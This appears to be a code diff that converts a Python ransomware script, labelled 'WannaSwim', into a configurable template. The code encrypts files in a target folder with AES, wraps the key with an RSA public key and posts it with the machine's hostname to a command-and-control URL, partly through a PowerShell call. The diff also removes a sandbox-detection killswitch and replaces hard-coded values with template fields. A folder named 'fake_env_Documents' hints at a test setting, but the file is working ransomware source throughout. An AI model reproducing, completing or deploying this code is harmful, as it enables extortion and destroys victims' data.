@@ -1,4 +1,12 @@
-# --- bloc_import ---
+{#---
+name: WannaSwim
+malware_type: ransomware
+lang: python
+description: WannaSwim is a ransomware payload written in Python.
+---#}
+
+# --- IMPORTS ---
+import os
 import requests
 import sys
 import random
@@ -6,7 +14,6 @@ import string
 import shutil
 import socket
 import datetime
-import os
 import subprocess
 import json
 from pathlib import Path
@@ -17,32 +24,19 @@ from Crypto.Util.Padding import pad
 from Crypto.PublicKey import RSA
 import base64
 
+# --- CONFIGURATION ---
+C2_URL = "{{ c2_url }}"
+FOLDER_PATH = r"{{ folder_path }}"
+RSA_KEY = "{{ rsa_key_b64 }}"
+EXTENSION = "{{ file_extension }}"
 
+
+# --- LOGIQUE ---
 # --- bloc_resolve_path ---
 def resolve_path(path_str):
   expanded = os.path.expandvars(path_str)  # Remplace %USERPROFILE%, etc.
   expanded = os.path.expanduser(expanded)  # Remplace ~
   return Path(expanded)
-
-
-# --- bloc_killswitch ---
-def killswitch():
-  url = ''.join(random.choices(string.ascii_letters + string.digits, k=40)) + ".com"
-  try:
-      request_random = requests.get(url)
-      if request_random.status_code == 200:
-          return True
-  except requests.exceptions.RequestException:
-      pass
-  try:
-      request_google = requests.get("https://www.google.com")
-      if request_google.status_code == 200:
-          return False
-      else:
-          return True
-  except requests.exceptions.RequestException:
-      return True
-
 
 # --- bloc_generate_aes_key ---
 def generate_aes_key():
@@ -67,7 +61,7 @@ def encrypt_file(file_path, key):
       file_data = f.read()
   cipher = AES.new(key, AES.MODE_CBC)
   ct_bytes = cipher.encrypt(pad(file_data, AES.block_size))
-  encrypted_file_path = file_path.with_suffix(file_path.suffix + '.shoubadidou')
+  encrypted_file_path = file_path.with_suffix(file_path.suffix + '.{{ file_extension }}')
   with open(encrypted_file_path, 'wb') as f:
       f.write(cipher.iv)
       f.write(ct_bytes)
@@ -76,7 +70,7 @@ def encrypt_file(file_path, key):
 
 # --- bloc_encrypt_fake_env_files ---
 def encrypt_fake_env_files():
-  fake_root = resolve_path("C:/Users/fsali/Documents/fake_env_Documents")
+  fake_root = resolve_path("{{ folder_path }}")
   if not fake_root.exists():
       return
   aes_key = generate_aes_key()
@@ -92,7 +86,7 @@ def encrypt_fake_env_files():
 def send_aes_key_to_c2(key):
   public_key = load_rsa_public_key()
   encrypted_aes_key = encrypt_aes_key_with_rsa(key, public_key)
-  c2_url = "https://shoubadidou.requestcatcher.com/"
+  c2_url = "{{ c2_url }}"
   hostname = socket.gethostname()
   timestamp = datetime.datetime.now().isoformat()
   payload = {
@@ -117,7 +111,7 @@ Invoke-RestMethod -Uri "{c2_url}" -Method Post -Body '{json_payload}' -ContentTy
 
 # --- bloc_load_rsa_public_key ---
 def load_rsa_public_key():
-  b64_key = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnAB7GQ1uawa9iwN0KJjOo4NLfe6eda7MBFb41FY1/siCx0rQ9UYMrmoAl3YHyxY2X1NbJDEkE5U96warIgk6yukTwEsMC9vzsYTgbfIlXkHVBFiB+4XK6cFMo+syxWziqLclWlYRpqWaPiBZAKIuHptXUUT60b5VBZM1cKk6d5E5ASkGBm30iANIhcBG6YjWfn/MdgP4HcHmUrG9NmCaaosXiQxMMcFDBm8ASFSBAfER3jGmNiMYR0mVbBo6wBWAXXOLJiJiRaPPgH/wJ3S8/2SwexNHKWwhZ1FPvZ2E+DtVcSUi1eKBCyl9E0mtq9IjMD1nm+y9f90Lsmrq8h63fwIDAQAB"
+  b64_key = "{{ rsa_key_b64 }}"
   der_key = base64.b64decode(b64_key)
   return RSA.import_key(der_key)
 
@@ -129,8 +123,6 @@ def encrypt_aes_key_with_rsa(aes_key, public_key):
 
 
 # --- bloc_main ---
-if killswitch():
-    sys.exit()
-else:
+if __name__ == "__main__":
     encrypt_fake_env_files()
 
